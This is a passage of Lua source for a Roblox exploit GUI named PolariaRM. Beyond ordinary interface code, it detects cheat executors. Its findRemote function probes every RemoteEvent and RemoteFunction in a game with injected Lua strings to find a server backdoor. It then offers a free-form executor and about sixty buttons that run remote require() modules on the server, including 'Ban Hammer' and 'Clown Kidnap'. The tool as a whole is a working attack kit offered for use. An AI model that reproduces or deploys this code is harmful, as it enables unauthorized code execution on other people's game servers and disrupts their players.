    Radius = math.clamp(math.floor(Value), 0, 10)
    UI.CornerBox.Text = tostring(Radius)
    ApplyCorners(Radius)
    SaveSettings()
end)

UI.CensorRow = MakeSettingRow("CensorRow", 2)
MakeSettingLabel("CensorLabel", "Censor Names", 1, UI.CensorRow)

UI.CensorBtn, UI.CensorBtnLabel = MakeSettingButton("CensorBtn", 2, UI.CensorRow)
UI.CensorBtnLabel.Text = "OFF"

UI.CensorBtn.MouseButton1Click:Connect(function()
    CensorNames = not CensorNames
    UI.CensorBtnLabel.Text = CensorNames and "ON" or "OFF"
    SaveSettings()
end)

UI.KeybindRow = MakeSettingRow("KeybindRow", 3)
MakeSettingLabel("KeybindLabel", "Toggle Key", 1, UI.KeybindRow)

UI.KeybindBtn, UI.KeybindBtnLabel = MakeSettingButton("KeybindBtn", 2, UI.KeybindRow)
UI.KeybindBtnLabel.Text = "[None]"

UI.CreditsTitle = Add("CreditsTitle", "TextLabel", {
    Text = "Credits",
    TextWrapped = true,
    TextXAlignment = Enum.TextXAlignment.Center,
    TextScaled = true,
    FontFace = FontTitle,
    TextColor3 = White,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Size = UDim2.new(1, 0, 0, 30),
    LayoutOrder = 4,
    Parent = UI.SettingsContent,
})
UI.CreditsTitleGradient = Grad("CreditsTitleGradient", UI.CreditsTitle)

UI.CreditsRow = Add("CreditsRow", "Frame", {
    Size = UDim2.new(1, 0, 0, 28),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    LayoutOrder = 5,
    Parent = UI.SettingsContent,
})
UI.CreditsRowList = Add("CreditsRowList", "UIListLayout", {
    FillDirection = Enum.FillDirection.Horizontal,
    HorizontalAlignment = Enum.HorizontalAlignment.Center,
    VerticalAlignment = Enum.VerticalAlignment.Center,
    Padding = UDim.new(0, 10),
    SortOrder = Enum.SortOrder.LayoutOrder,
    Parent = UI.CreditsRow,
})
Add("CreditsRowPadding", "UIPadding", {
    PaddingBottom = UDim.new(0, 4),
    Parent = UI.CreditsRow,
})

UI.DevHeadshot = Add("DevHeadshot", "ImageLabel", {
    Image = GetAsset("PolariaRM/Assets/polaria_dev.png"),
    Size = UDim2.new(0, 26, 0, 26),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    ScaleType = Enum.ScaleType.Fit,
    LayoutOrder = 1,
    Parent = UI.CreditsRow,
})
UI.DevHeadshotStroke = PurpleStroke("DevHeadshotStroke", UI.DevHeadshot)
UI.DevHeadshotRatio = Add("DevHeadshotRatio", "UIAspectRatioConstraint", { Parent = UI.DevHeadshot })
UI.DevHeadshotCorner = Add("DevHeadshotCorner", "UICorner", { CornerRadius = UDim.new(1, 0), Parent = UI.DevHeadshot })

UI.CreditsText = Add("CreditsText", "TextLabel", {
    Text = "JustSomeGuest - Developer",
    TextWrapped = true,
    TextXAlignment = Enum.TextXAlignment.Left,
    TextSize = 20,
    FontFace = FontBody,
    TextColor3 = White,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Size = UDim2.new(1, -36, 0, 24),
    LayoutOrder = 2,
    Parent = UI.CreditsRow,
})
UI.CreditsTextGradient = Grad("CreditsTextGradient", UI.CreditsText)

local function Dragify(DragObject, MoveObject)
    MoveObject = MoveObject or DragObject

    local dragging = false
    local dragStart
    local startPos

    local function ClampPosition(newX, newY)
        local viewport = workspace.CurrentCamera.ViewportSize
        local size = MoveObject.AbsoluteSize
        local paddingX = 4
        local paddingY = 4

        local maxX = math.max(viewport.X / 2 - size.X / 2 - paddingX, 0)
        local maxY = math.max(viewport.Y / 2 - size.Y / 2 - paddingY, 0)

        newX = math.clamp(newX, -maxX, maxX)
        newY = math.clamp(newY, -maxY, maxY)

        return newX, newY
    end

    DragObject.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = MoveObject.Position
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if not dragging then
            return
        end

        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            local delta = input.Position - dragStart
            local newX = startPos.X.Offset + delta.X
            local newY = startPos.Y.Offset + delta.Y

            newX, newY = ClampPosition(newX, newY)

            MoveObject.Position = UDim2.new(startPos.X.Scale, newX, startPos.Y.Scale, newY)
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
end

Dragify(UI.MainFrame, UI.Container)
Dragify(UI.Show)

local TabDefs = {
    { Btn = UI.HomeTab, Label = UI.HomeTabLabel, Content = UI.HomeContent },
    { Btn = UI.ScanTab, Label = UI.ScanTabLabel, Content = UI.ScannerContent },
    { Btn = UI.ScriptsTab, Label = UI.ScriptsTabLabel, Content = UI.ScriptsContent },
    { Btn = UI.ExeTab, Label = UI.ExeTabLabel, Content = UI.ExeContent },
    { Btn = UI.SettingsTab, Label = UI.SettingsTabLabel, Content = UI.SettingsContent },
}

local SLIDE_TIME = 0.3

local activeTab = nil
currentContent = UI.HomeContent

local function showContent(contentFrame)
    if currentContent then
        currentContent.Visible = false
    end
    contentFrame.Visible = true
    currentContent = contentFrame
end

local function TabOffset(Def)
    local Index = Def.Btn.LayoutOrder - 1
    return UDim2.new(Index / TAB_COUNT, Index * TAB_PAD / TAB_COUNT, 0, 0)
end

local function setTab(Def)
    UI.TabHighlight.Visible = true

    local SlideTween = Tween(UI.TabHighlight, SLIDE_TIME, {
        Position = TabOffset(Def)
    }, "Quad", "Out")

    SlideTween:Play()

    activeTab = Def
end

for _, Def in ipairs(TabDefs) do
    Def.Btn.MouseButton1Click:Connect(function()
        setTab(Def)
        showContent(Def.Content)
    end)
end

task.defer(function()
    setTab(TabDefs[1])
end)

UI.Close.MouseButton1Click:Connect(function()
    local hideTween = Tween(UI.Container, 0.3, {
        Size = UDim2.new(0, 0, 0, 0),
        Position = UDim2.new(0.5, 0, 0.5, 0)
    }, "Quad", "In")

    hideTween:Play()
    hideTween.Completed:Wait()
    UI.ScreenGui:Destroy()
    Env.PolariaRM.IsLoaded = false
    Env.PolariaRM.Gui = nil
end)

local function HideWindow()
    local hideTween = Tween(UI.Container, 0.3, {
        Size = UDim2.new(0, 0, 0, 0),
        Position = UDim2.new(0.5, 0, 0.5, 0)
    }, "Quad", "In")

    hideTween:Play()
    hideTween.Completed:Wait()
    UI.Container.Visible = false
    UI.Show.Visible = true

    UI.Show.Size = UDim2.new(0, 0, 0, 0)
    local showTween = Tween(UI.Show, 0.3, {
        Size = UDim2.new(0, 40, 0, 40)
    }, "Back", "Out")
    showTween:Play()
end

local function ShowWindow()
    UI.Show.Visible = false
    UI.Container.Visible = true

    UI.Container.Size = UDim2.new(0, 0, 0, 0)
    local showTween = Tween(UI.Container, 0.3, {
        Size = WindowSize
    }, "Back", "Out")
    showTween:Play()

    local hideShowTween = Tween(UI.Show, 0.3, {
        Size = UDim2.new(0, 0, 0, 0)
    }, "Quad", "In")
    hideShowTween:Play()
end

UI.Hide.MouseButton1Click:Connect(HideWindow)
UI.Show.MouseButton1Click:Connect(ShowWindow)

local IgnoredKeys = {
    [Enum.KeyCode.Unknown] = true,
    [Enum.KeyCode.LeftShift] = true,
    [Enum.KeyCode.RightShift] = true,
    [Enum.KeyCode.LeftAlt] = true,
    [Enum.KeyCode.RightAlt] = true,
    [Enum.KeyCode.LeftControl] = true,
    [Enum.KeyCode.RightControl] = true,
    [Enum.KeyCode.Tab] = true,
}

local UpdateKeybindText

UpdateKeybindText = function()
    if listeningForKey then
        UI.KeybindBtnLabel.Text = "..."
        return
    end

    UI.KeybindBtnLabel.Text = ToggleKey and ("[" .. ToggleKey.Name .. "]") or "[None]"
end

UI.KeybindBtn.MouseButton1Click:Connect(function()
    listeningForKey = true
    UpdateKeybindText()
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if listeningForKey then
        if gameProcessed or input.UserInputType ~= Enum.UserInputType.Keyboard then
            return
        end

        if input.KeyCode == Enum.KeyCode.Backspace then
            ToggleKey = nil
        elseif not IgnoredKeys[input.KeyCode] then
            ToggleKey = input.KeyCode
        else
            return
        end

        listeningForKey = false
        UpdateKeybindText()
        SaveSettings()
        return
    end

    if ToggleKey and input.KeyCode == ToggleKey and not gameProcessed then
        if not UI.Container or not UI.Container.Parent then
            return
        end

        if UI.Container.Visible then
            task.spawn(HideWindow)
        else
            ShowWindow()
        end
    end
end)

UpdateKeybindText()

UI.Container.Visible = false
UI.Show.Visible = true

if Env.PolariaRM.IsLoaded and Env.PolariaRM.Gui and Env.PolariaRM.Gui.Parent then
    local SetCore = StarterGui.SetCore

    if SetCore then
        SetCore(StarterGui, "SendNotification", {
            Title = "PolariaRM",
            Text = "Polaria Remastered is already running!",
            Icon = Logo,
            Duration = 4
        })
    end

    UI.ScreenGui:Destroy()
    return
end

Env.PolariaRM.IsLoaded = true
Env.PolariaRM.Gui = UI.ScreenGui

coroutine.wrap(function()
    local GetThumbnail = Players.GetUserThumbnailAsync
    if GetThumbnail then
        local success, headshot = pcall(function()
            return GetThumbnail(Players, Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
        end)
        if success and headshot then
            UI.Headshot.Image = headshot
        end
    end
end)()

RunService.RenderStepped:Connect(function(dt)
    lastDT = dt
end)

serverStartTime = workspace:GetServerTimeNow()

local function getOS()
    local GetPlatform = UserInputService.GetPlatform
    if GetPlatform then
        local p = GetPlatform(UserInputService)
        if p == Enum.Platform.Windows then return "Windows" end
        if p == Enum.Platform.OSX then return "macOS" end
        if p == Enum.Platform.IOS then return "iOS" end
        if p == Enum.Platform.Android then return "Android" end
    end
    return "Unknown"
end

local function updateStats()
    local fps = lastDT > 0 and math.floor(1 / lastDT) or 0

    local ping = 0
    local net = Stats:FindFirstChild("Network")
    if net then
        local item = net:FindFirstChild("ServerStatsItem")
        if item and item:FindFirstChild("Data Ping") then
            local GetValue = item["Data Ping"].GetValue
            if GetValue then
                ping = math.floor(GetValue(item["Data Ping"]))
            end
        end
    end

    local serverAge = math.floor(workspace:GetServerTimeNow() - serverStartTime)

    local device = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and "Mobile" or "PC"
    local osName = getOS()

    local executor = "Unknown"
    
    local executorChecks = {
        {cond = syn and syn.request, name = "Synapse X"},
        {cond = KRNL_IsLoaded, name = "KRNL"},
        {cond = fluxus, name = "Fluxus"},
        {cond = is_sirhurt_closure, name = "SirHurt"},
        {cond = PROTOSMASHER_IsLoaded, name = "ProtoSmasher"},
        {cond = ELECTRON_IsLoaded, name = "Electron"},
        {cond = is_synapse_function, name = "Synapse X"},
        {cond = identifyexecutor, name = identifyexecutor and identifyexecutor() or nil},
        {cond = getexecutorname, name = getexecutorname and getexecutorname() or nil}
    }
    
    for _, check in ipairs(executorChecks) do
        if check.cond and check.name then
            executor = check.name
            break
        end
    end

    local muted = "<font color='#8D95A7'>"
    local displayName = CensorNames and MaskName(Player.DisplayName) or Player.DisplayName
    local userName = CensorNames and MaskName(Player.Name) or Player.Name

    UI.HomeStats.Text =
        "Welcome, <b>" .. displayName .. "</b> (@" .. userName .. ")\n" ..
        muted .. "FPS:</font> " .. fps ..
        "\n" .. muted .. "Ping:</font> " .. ping .. "ms" ..
        "\n" .. muted .. "Server age:</font> " .. serverAge .. "s" ..
        "\n" .. muted .. "Device:</font> " .. device ..
        "\n" .. muted .. "OS:</font> " .. osName ..
        "\n" .. muted .. "Executor:</font> " .. executor
end

task.spawn(function()
    while UI.ScreenGui and UI.ScreenGui.Parent do
        updateStats()
        task.wait(0.5)
    end
end)

local alphabet = {
    'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
    'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'
}

local function generateName(lenght)
    local text = ''
    for i = 1, lenght do
        text = text .. alphabet[math.random(1, #alphabet)]
    end
    return text
end

local function runRemote(remote, data)
    if remote then
        local isRemoteEvent = remote:IsA("RemoteEvent")
        local isRemoteFunction = remote:IsA("RemoteFunction")
        
        if isRemoteEvent then
            local FireServer = remote.FireServer
            if FireServer then
                FireServer(remote, data)
            end
        elseif isRemoteFunction then
            local InvokeServer = remote.InvokeServer
            if InvokeServer then
                spawn(function() 
                    InvokeServer(remote, data)
                end)
            end
        end
    end
end

local function findRemote()
    UI.ScanStatus.Text = "Scanning for backdoors..."
    
    local timee = os.clock()
    local remotes = {}
    local code
    
    local GetProductInfo = MarketplaceService and MarketplaceService.GetProductInfo
    local gameName = "Unknown Game"
    if GetProductInfo then
        local success, info = pcall(function()
            return GetProductInfo(MarketplaceService, game.PlaceId)
        end)
        if success and info then
            gameName = info.Name
        end
    end
    
    local placeId = game.PlaceId
    local PlayerName = Player.Name
    local userId = Player.UserId
    local accountAge = Player.AccountAge
    
    if ReplicatedStorage then
        local protected_backdoor = ReplicatedStorage:FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
        if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
            while true do
                code = generateName(math.random(12,30))
                if not remotes[code] then 
                    break 
                end
            end
            spawn(function() 
                local InvokeServer = protected_backdoor.InvokeServer
                if InvokeServer then
                    InvokeServer(protected_backdoor, '.', "a=Instance.new('Model',workspace)a.Name='"..code.."'")
                end
            end)
            remotes[code] = protected_backdoor
        end
    end
    
    for i, remote in game:GetDescendants() do
        local isRemoteEvent = remote:IsA("RemoteEvent")
        local isRemoteFunction = remote:IsA("RemoteFunction")
        
        if not isRemoteEvent and not isRemoteFunction then 
            continue 
        end
        
        if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
            continue
        end
        
        if ReplicatedStorage and (remote.Parent == ReplicatedStorage or 
           remote.Parent.Parent == ReplicatedStorage or 
           remote.Parent.Parent.Parent == ReplicatedStorage) then
            
            if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
                continue
            end
            
            if remote.Parent and remote.Parent.Parent and remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then
                continue
            end
            
            if remote.Parent and remote.Parent.Name == 'ExpectChatSystemChatEvents' then
                continue
            end
        end
        
        while true do
            code = generateName(math.random(12,30))
            if not remotes[code] then 
                break 
            end
        end
        
        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        remotes[code] = remote
    end
    
    for i = 1, 100 do
        for code, remote in remotes do
            if workspace:FindFirstChild(code) then
                runRemote(remote, "require(171016405.1884*69)")
                
                backdoorRemote = remote
                UI.ScanStatus.Text = "Backdoor found at: " .. remote:GetFullName()
                return remote
            end
        end
        wait()
    end
    
    UI.ScanStatus.Text = "No backdoor found"
    return false
end

UI.ScanBtn.MouseButton1Click:Connect(function()
    findRemote()
end)

local function CreateButton(name, code)
    local newButton = UI.BtnExample:Clone()
    newButton.Name = name
    newButton.Visible = true
    newButton.Parent = UI.ScriptsContent

    Hover(newButton, { BackgroundColor3 = White }, { BackgroundColor3 = DimWhite })
    
    local label = newButton:FindFirstChild("BtnExampleLabel", true)
    if label then
        label.Text = name
    end
    
    newButton.MouseButton1Click:Connect(function()
        if backdoorRemote then
            runRemote(backdoorRemote, code)
        else
            local SetCore = StarterGui.SetCore
            if SetCore then
                SetCore(StarterGui, "SendNotification", {
                    Title = "PolariaRM (Error)",
                    Text = "No backdoor found! Scan first.",
                    Icon = Logo,
                    Duration = 3
                })
            end
        end
    end)
end

CreateButton("Horseman", "require(3737497650).load('" .. Player.Name .. "')")
CreateButton("The Hotline", "require(5813879549).load('" .. Player.Name .. "')")
CreateButton("Potato Man", "require(4618428149).load('" .. Player.Name .. "')")
CreateButton("Master Chief", "require(5812973403).Halo('" .. Player.Name .. "')")
CreateButton("Oculus", "require(5813695241).load('" .. Player.Name .. "')")
CreateButton("Hypercar", "require(5874393699).load('" .. Player.Name .. "')")
CreateButton("Neon Overlord", "require(5876551530).load('" .. Player.Name .. "')")
CreateButton("Clown Kidnap", "require(5591099977)('" .. Player.Name .. "')")
CreateButton("Thanos", "require(4920151387).load('" .. Player.Name .. "')")
CreateButton("The sun is a deadly lazer", "require(5751710030).Sun('" .. Player.Name .. "')")
CreateButton("Ying Yang", "require(4875966146).load('" .. Player.Name .. "')")
CreateButton("Titanium Runner", "require(5375511885).Player('" .. Player.Name .. "')")
CreateButton("Crypt", "require(5455352803).crypt('" .. Player.Name .. "')")
CreateButton("Rainbow Factory", "require(4823100870).HowRainbowsAreMade('" .. Player.Name .. "')")
CreateButton("Ares The Bladist", "require(5813806760).load('" .. Player.Name .. "')")
CreateButton("Visualizer", "require(5684993096).load('" .. Player.Name .. "')")
CreateButton("Hacker X", "require(5641200549).load('" .. Player.Name .. "')")
CreateButton("Fallen Angel", "require(4490557105).load('" .. Player.Name .. "')")
CreateButton("Dodge Charger", "require(4697572245).load('" .. Player.Name .. "')")
CreateButton("Soldier", "require(5177488826).Soldier('" .. Player.Name .. "')")
CreateButton("Grab Knife", "require(5516594078)('" .. Player.Name .. "')")
CreateButton("Pizza Guy", "require(4657036575).load('" .. Player.Name .. "')")
CreateButton("Darth Vader", "require(5441060212).load('" .. Player.Name .. "')")
CreateButton("Ban Hammer", "require(5448035802).Hammer('" .. Player.Name .. "', 'BanHammer')")
CreateButton("Crescendo", "require(4328810253).load('" .. Player.Name .. "')")
CreateButton("Hell Robotics", "require(5813792606).load('" .. Player.Name .. "')")
CreateButton("Cyber Knight", "require(5617200606).Cyber('" .. Player.Name .. "')")
CreateButton("Articulacy", "require(5730283203).Articulacy('" .. Player.Name .. "')")
CreateButton("Neptunian V", "require(4453491513).load('" .. Player.Name .. "')")
CreateButton("Obliterator", "require(5375491266).Player('" .. Player.Name .. "')")
CreateButton("Rainbow Stand", "require(5367599184).Dark('" .. Player.Name .. "')")
CreateButton("Tron Bike", "require(4021975182).load('" .. Player.Name .. "')")
CreateButton("Infinity Gauntlet", "require(5375537557).Dark('" .. Player.Name .. "')")
CreateButton("Templar", "require(5313663424).Dark('" .. Player.Name .. "')")
CreateButton("Baseball Bat", "require(4559977647).load('" .. Player.Name .. "')")
CreateButton("Dominus Venari", "require(3256686965).load('" .. Player.Name .. "')")
CreateButton("Blind Reaper", "require(4185644819).a('" .. Player.Name .. "')")
CreateButton("SCP 106", "require(4935275557):Subaru112('" .. Player.Name .. "', 'Subaru112\'s SCP-106')")
CreateButton("Dubstep Gun", "require(4442010059).load('" .. Player.Name .. "')")
CreateButton("Karambit", "require(5970744588).load('" .. Player.Name .. "')")
CreateButton("Infinite Yield", "require(13716575182)('" .. Player.Name .. "')")
CreateButton("Death Sheriff", "require(6056559552).load('" .. Player.Name .. "')")
CreateButton("Dominus Frigidus", "require(6054361648).load('" .. Player.Name .. "')")
CreateButton("Piano", "require(5983549520).load('" .. Player.Name .. "')")
CreateButton("Chat Control Gui", "require(5903403087).load('" .. Player.Name .. "')")
CreateButton("Echo", "require(5374597845).Dark('" .. Player.Name .. "')")
CreateButton("KFC", "require(3615713971).load('" .. Player.Name .. "')")
CreateButton("Legake Glove", "require(5187166380)('" .. Player.Name .. "')")
CreateButton("Chainsaw", "require(4560014954).load('" .. Player.Name .. "')")
CreateButton("Dark Eccentric Wrench", "require(5712519660).load('" .. Player.Name .. "')")
CreateButton("Alpha Gattling Gun", "require(5451379778).Gun('" .. Player.Name .. "')")
CreateButton("Frisk", "require(5849995364).load('" .. Player.Name .. "')")
CreateButton("Gentleman Killbot", "require(5430831931).Dark('" .. Player.Name .. "')")
CreateButton("Despacito Mech", "require(4105428725).load('" .. Player.Name .. "')")
CreateButton("Sirenhead", "require(5239955586).Dark('" .. Player.Name .. "')")
CreateButton("Lost Soul", "require(5390158029).Dark('" .. Player.Name .. "')")
CreateButton("Betty Noire", "require(5139373601).load('" .. Player.Name .. "')")
CreateButton("Hallow Slayer", "require(2675506369).hal('" .. Player.Name .. "')")
CreateButton("Skid Beater", "require(3530402272)('" .. Player.Name .. "')")
CreateButton("Chronos Sentinel", "require(3089107241).naenae('" .. Player.Name .. "')")
CreateButton("Pity Hub", "require(3253460334)('" .. Player.Name .. "')")

UI.BtnExample:Destroy()

UI.Exe.MouseButton1Click:Connect(function()
    local SetCore = StarterGui.SetCore
    if backdoorRemote and UI.InputBox.Text ~= "" then
        runRemote(backdoorRemote, UI.InputBox.Text)
    elseif not backdoorRemote and SetCore then
        SetCore(StarterGui, "SendNotification", {
            Title = "PolariaRM (Error)",
            Text = "No backdoor found! Scan first.",
            Icon = Logo,
            Duration = 3
        })
    end
end)

UI.Clr.MouseButton1Click:Connect(function()
    UI.InputBox.Text = ""
end)

UI.Re.MouseButton1Click:Connect(function()
    local SetCore = StarterGui.SetCore
    local success, errorMsg = pcall(function()
        if backdoorRemote then
            local TARGET_USERNAME = Player.Name
            
            local RefreshScript = [[
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local Players = game:GetService("Players")
                local TARGET_USERNAME = "]] .. TARGET_USERNAME .. [["
                
                local refreshRemote
                if not ReplicatedStorage:FindFirstChild("RefreshCharacterRemote") then
                    refreshRemote = Instance.new("RemoteEvent")
                    refreshRemote.Name = "RefreshCharacterRemote"
                    refreshRemote.Parent = ReplicatedStorage
                else
                    refreshRemote = ReplicatedStorage:FindFirstChild("RefreshCharacterRemote")
                end
                
                refreshRemote.OnServerEvent:Connect(function(Player)
                    if Player.Name == TARGET_USERNAME then
                        Player:LoadCharacter()
                    end
                end)
                
                local function handleExistingPlayer(Player)
                    if Player.Name == TARGET_USERNAME then
                        task.wait(0.5)
                        Player:LoadCharacter()
                    end
                end
                
                for _, Player in ipairs(Players:GetPlayers()) do
                    handleExistingPlayer(Player)
                end
                
                Players.PlayerAdded:Connect(handleExistingPlayer)
            ]]
            
            runRemote(backdoorRemote, RefreshScript)
        elseif SetCore then
            SetCore(StarterGui, "SendNotification", {
                Title = "PolariaRM (Error)",
                Text = "No backdoor found! Scan first.",
                Icon = Logo,
                Duration = 3
            })
        end
    end)
    
    if not success and SetCore then
        SetCore(StarterGui, "SendNotification", {
            Title = "PolariaRM (Error)",
            Text = "Failed to execute: " .. tostring(errorMsg),
            Icon = Logo,
            Duration = 3
        })
    end
end)